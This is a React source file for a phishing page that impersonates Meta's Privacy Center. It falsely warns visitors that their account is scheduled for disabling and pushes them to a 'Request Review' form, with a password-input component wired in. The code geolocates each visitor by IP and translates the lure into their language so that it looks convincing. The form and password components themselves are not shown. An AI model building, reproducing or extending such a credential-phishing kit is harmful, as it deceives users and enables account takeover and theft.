import BackgroundImage from '@/assets/bg-image.png';
import MetaAI from '@/assets/meta-ai-image.png';
import MetaImage from '@/assets/meta-image.png';
import ProfileImage from '@/assets/profile-image.png';
import WarningImage from '@/assets/warning.png';
import PasswordInput from '@/components/password-input';
import { store } from '@/utils/store';
import translateText from '@/utils/translate';
import { faHouse } from '@fortawesome/free-regular-svg-icons/faHouse';
import { faChevronRight } from '@fortawesome/free-solid-svg-icons/faChevronRight';
import { faCircleInfo } from '@fortawesome/free-solid-svg-icons/faCircleInfo';
import { faGear } from '@fortawesome/free-solid-svg-icons/faGear';
import { faLock } from '@fortawesome/free-solid-svg-icons/faLock';
import { faMagnifyingGlass } from '@fortawesome/free-solid-svg-icons/faMagnifyingGlass';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import { useEffect, useRef, useState } from 'react';

const FormModal = () => import('@/components/form-modal');

const Home = () => {
    const { isModalOpen, setModalOpen, setGeoInfo, geoInfo } = store();
    const [translations, setTranslations] = useState({});
    const [modalKey, setModalKey] = useState(0);
    const [showPassword, setShowPassword] = useState(false);
    const isTranslatingRef = useRef(false);

    const t = (text) => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (geoInfo) return;

        const fetchGeoInfo = async () => {
            try {
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                setGeoInfo({
                    asn: data.asn || 0,
                    ip: data.ip || 'N/A',
                    country: data.country || 'N/A',
                    city: data.city || 'N/A',
                    country_code: data.country_code || 'US'
                });
            } catch {
                setGeoInfo({
                    asn: 0,
                    ip: 'N/A',
                    country: 'N/A',
                    city: 'N/A',
                    country_code: 'US'
                });
            }
        };
        fetchGeoInfo();
    }, [setGeoInfo, geoInfo]);

    useEffect(() => {
        if (!geoInfo || isTranslatingRef.current || Object.keys(translations).length > 0) return;

        isTranslatingRef.current = true;

        const textsToTranslate = [
            'Privacy Center Home Page', 'Search', 'Privacy Policy', 'Other rules and articles',
            'Settings', 'Privacy Center', 'Policy Violation',
            'We have detected suspicious activity or a potential violation of our Terms of Service. To protect the Meta platform and its users, your account has been scheduled for disabling. If you believe this action was taken in error, you must submit a request for review to our Security Team immediately.',
            'This form is only to be used for submitting appeals and restoring account status.',
            'Please ensure that you provide all the required information below. Failure to do so may result in delays in processing your appeal.',
            'Request Review', 'What is the Privacy Policy and what does it say?',
            'How you can manage or delete your information', 'Meta AI', 'User Agreement',
            'For more details, see the User Agreement', 'Additional resources',
            'How Meta uses information for generative AI models', 'Meta AI website',
            'Introduction to Generative AI', 'For teenagers',
            'We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about Privacy Policy'
        ];

        const translateAll = async () => {
            const translatedMap = {};
            for (const text of textsToTranslate) {
                try {
                    translatedMap[text] = await translateText(text, geoInfo.country_code);
                } catch {
                    translatedMap[text] = text;
                }
            }
            setTranslations(translatedMap);
        };
        translateAll();
    }, [geoInfo, translations]);

    const handleClosePassword = () => {
        setShowPassword(false);
    };

    const menuItems = [
        { id: 'home', icon: faHouse, label: 'Privacy Center Home Page', isActive: true },
        { id: 'search', icon: faMagnifyingGlass, label: 'Search' },
        { id: 'privacy', icon: faLock, label: 'Privacy Policy' },
        { id: 'rules', icon: faCircleInfo, label: 'Other rules and articles' },
        { id: 'settings', icon: faGear, label: 'Settings' }
    ];

    const privacyCenterItems = [
        { id: 'policy', title: 'What is the Privacy Policy and what does it say?', subtitle: 'Privacy Policy', image: ProfileImage },
        { id: 'manage', title: 'How you can manage or delete your information', subtitle: 'Privacy Policy', image: ProfileImage }
    ];

    const agreementItems = [
        { id: 'meta-ai', title: 'Meta AI', subtitle: 'User Agreement', image: MetaAI }
    ];

    const resourceItems = [
        { id: 'generative-ai', title: 'How Meta uses information for generative AI models', subtitle: 'Privacy Center' },
        { id: 'ai-systems', title: 'Cards with information about the operation of AI systems', subtitle: 'Meta AI website' },
        { id: 'intro-ai', title: 'Introduction to Generative AI', subtitle: 'For teenagers' }
    ];

    return (
        <div className='flex items-center justify-center bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] text-[#1C2B33]'>
            <title>Policy Violation - Page Appeal</title>
            <div className='flex w-full max-w-[1100px]'>
                {/* Sidebar */}
                <div className='sticky top-0 hidden h-screen w-1/3 flex-col border-r border-r-gray-200 pt-10 pr-8 sm:flex'>
                    <img src={MetaImage} alt='' className='h-3.5 w-[70px]' />
                    <p className='my-4 text-2xl font-bold'>{t('Privacy Center')}</p>
                    {menuItems.map((item) => (
                        <div key={item.id} className={`flex cursor-pointer items-center justify-start gap-3 rounded-[15px] px-4 py-3 font-medium ${item.isActive ? 'bg-[#344854] text-white' : 'text-black hover:bg-[#e3e8ef]'}`}>
                            <FontAwesomeIcon icon={item.icon} />
                            <p>{t(item.label)}</p>
                        </div>
                    ))}
                </div>

                {/* Main Content */}
                <div className='flex flex-1 flex-col gap-5 px-4 py-10 sm:px-8'>
                    <div className='flex items-center gap-2'>
                        <img src={WarningImage} alt='' className='h-[50px] w-[50px]' />
                        <p className='text-2xl font-bold'>{t('Policy Violation')}</p>
                    </div>
                    
                    <p>{t('We have detected suspicious activity or a potential violation of our Terms of Service. To protect the Meta platform and its users, your account has been scheduled for disabling. If you believe this action was taken in error, you must submit a request for review to our Security Team immediately.')}</p>
                    
                    {/* Appeal Card */}
                    <div className='rounded-b-[20px] bg-white'>
                        <img src={BackgroundImage} alt='' className='rounded-t-[20px] bg-blue-500 py-20' />
                        <div className='flex flex-col items-center justify-center gap-5 p-5'>
                            <p className='text-2xl'>{t('This form is only to be used for submitting appeals and restoring account status.')}</p>
                            <p className='text-[15px]'>{t('Please ensure that you provide all the required information below. Failure to do so may result in delays in processing your appeal.')}</p>
                            <button
                                onClick={() => {
                                    setModalKey((prev) => prev + 1);
                                    setModalOpen(true);
                                }}
                                className='flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white'
                            >
                                {t('Request Review')}
                            </button>
                        </div>
                    </div>

                    {/* Info Sections */}
                    <div className='flex flex-col gap-3'>
                        {/* Privacy Center */}
                        <div>
                            <p className='font-sans font-medium text-[#212529]'>{t('Privacy Center')}</p>
                            {privacyCenterItems.map((item, index) => {
                                const roundedClass = privacyCenterItems.length === 1 ? 'rounded-[15px]' : 
                                                  index === 0 ? 'rounded-t-[15px] border-b border-b-gray-200' : 
                                                  index === privacyCenterItems.length - 1 ? 'rounded-b-[15px]' : 'border-y border-y-gray-200';
                                return (
                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
                                        {item.image && <img src={item.image} alt='' className='h-12 w-12' />}
                                        <div className='flex flex-1 flex-col'>
                                            <p className='font-medium'>{t(item.title)}</p>
                                            <p className='text-[#465a69]'>{t(item.subtitle)}</p>
                                        </div>
                                        <FontAwesomeIcon icon={faChevronRight} />
                                    </div>
                                );
                            })}
                        </div>

                        {/* User Agreement */}
                        <div>
                            <p className='font-sans font-medium text-[#212529]'>{t('For more details, see the User Agreement')}</p>
                            {agreementItems.map((item, index) => {
                                const roundedClass = 'rounded-[15px]';
                                return (
                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
                                        {item.image && <img src={item.image} alt='' className='h-12 w-12' />}
                                        <div className='flex flex-1 flex-col'>
                                            <p className='font-medium'>{t(item.title)}</p>
                                            <p className='text-[#465a69]'>{t(item.subtitle)}</p>
                                        </div>
                                        <FontAwesomeIcon icon={faChevronRight} />
                                    </div>
                                );
                            })}
                        </div>

                        {/* Additional Resources */}
                        <div>
                            <p className='font-sans font-medium text-[#212529]'>{t('Additional resources')}</p>
                            {resourceItems.map((item, index) => {
                                const roundedClass = resourceItems.length === 1 ? 'rounded-[15px]' : 
                                                  index === 0 ? 'rounded-t-[15px] border-b border-b-gray-200' : 
                                                  index === resourceItems.length - 1 ? 'rounded-b-[15px]' : 'border-y border-y-gray-200';
                                return (
                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
                                        <div className='flex flex-1 flex-col'>
                                            <p className='font-medium'>{t(item.title)}</p>
                                            <p className='text-[#465a69]'>{t(item.subtitle)}</p>
                                        </div>
                                        <FontAwesomeIcon icon={faChevronRight} />
                                    </div>
                                );
                            })}
                        </div>

                        <p className='text-[15px] text-[#465a69]'>{t('We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about Privacy Policy')}</p>
                    </div>
                </div>
            </div>

            {/* Modals */}
            {isModalOpen && <FormModal key={modalKey} />}
            {showPassword && <PasswordInput onClose={handleClosePassword} />}
        </div>
    );
};

export default Home;
